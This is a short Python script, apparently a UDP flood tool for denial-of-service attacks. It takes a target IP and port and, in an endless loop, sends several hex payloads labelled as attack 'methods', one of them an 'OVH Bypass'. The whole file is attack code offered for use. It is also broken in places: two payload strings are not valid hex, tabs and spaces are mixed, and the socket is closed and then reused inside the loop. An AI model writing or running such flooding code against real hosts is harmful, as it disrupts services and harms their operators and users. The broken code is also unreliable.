# 9/22/2019
# UDP HEX FLOOD 
# Twitter: FuckBinary
# Discord: SmallDoink#0666
# KillerHill.py IP PORT
import os 
import socket
import argparse

def hit():
    IPADDR = arguments.ip
    PORTNUM = arguments.port

    payload = 'ffffffff54536f7572636520456e67696e6520517565727900'.decode('hex') # HEX Method
    payload2 = '01010000000000000000000000000000'.decode('hex') # RiP Method
    payload3 = '0014000103'.decode('hex') # ARD Method
    ovh = '000000000000003889787184zz949084'.decode('hex') #OVH Bypass
	hill = '37489871239478643598127845201276845976823'.decode('hex') # My Special Method (Forced Flood)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    1 == 1
    while True:
            s.connect((IPADDR, PORTNUM))
            s.send(payload) # Comment this line out to not send the method
            s.send(payload2) # Comment this line out to not send the method
            s.send(payload3) # Comment this line out to not send the method
            s.send(ovh) # Comment this line out to not send the method
			s.send(hill) # Comment this line out to not send the method
            s.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="simple script with various hex methods"
    )


    parser.add_argument('ip', help="ip to attack")
    parser.add_argument('port', help='port to attack')


    arguments = parser.parse_args()

    hit()